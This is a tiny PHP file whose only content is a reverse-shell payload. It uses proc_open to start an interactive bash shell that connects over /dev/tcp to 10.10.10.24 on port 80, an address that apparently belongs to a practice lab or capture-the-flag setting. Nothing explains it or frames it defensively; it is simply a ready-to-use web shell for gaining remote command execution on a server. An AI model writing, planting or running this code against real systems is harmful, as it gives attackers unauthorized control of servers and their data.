<?php
$descriptorspec = array(
0 => array('pipe', 'r'),
1 => array('pipe', 'w'),
2 => array('pipe', 'a')
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.24/80 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
?>
